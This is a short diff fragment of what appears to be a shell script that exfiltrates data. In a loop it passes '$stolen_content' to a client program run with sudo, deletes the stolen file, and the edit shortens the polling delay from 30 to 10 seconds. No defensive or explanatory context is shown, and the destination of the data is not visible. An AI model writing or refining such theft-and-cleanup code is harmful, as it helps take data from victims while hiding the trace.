@@ -12,5 +12,5 @@ do
     sudo python3 client.py "$stolen_content"
     rm "$stolen_file"
   fi
-  sleep 30
+  sleep 10
 done
